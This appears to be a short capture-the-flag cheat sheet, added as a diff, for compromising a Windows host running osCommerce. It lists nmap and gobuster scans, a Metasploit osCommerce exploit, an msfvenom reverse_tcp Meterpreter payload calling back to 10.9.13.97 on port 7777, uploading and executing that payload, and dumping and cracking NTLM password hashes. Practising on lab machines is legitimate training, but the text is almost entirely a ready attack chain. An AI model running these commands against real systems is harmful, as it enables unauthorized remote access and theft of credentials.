@@ -1,0 +1,19 @@
+SCAN: 		nmap -sC -sV $IP
+GOBUSTER: 	gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -e
+METASPLOIT1:	msfconsole
+		search oscommerce
+		use #
+		show options & set RHOSTS $IP & set RPORT $PORT & set URI $install & set LHOST $localIP
+		exploit
+METERPRETER1:	cd to Deskop & cat root.flag
+MSFVENOM:	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.13.97 LPORT=7777 -f exe > shell.exe
+METERPRETER1:	upload shell.exe
+METASPLOIT2:	msfconsole
+		use exploit/multi/handler
+		set payload windows/meterpreter/reverse_tcp
+		show options & set LHOST $localIP & LPORT 7777
+METERPRETER1:	execute -f shell.exe
+METASPLOIT2:	exploit
+METERPRETER2:	getuid & hashdump & visit crack station for NTLM hash (second one)
+
+CrackStation.net
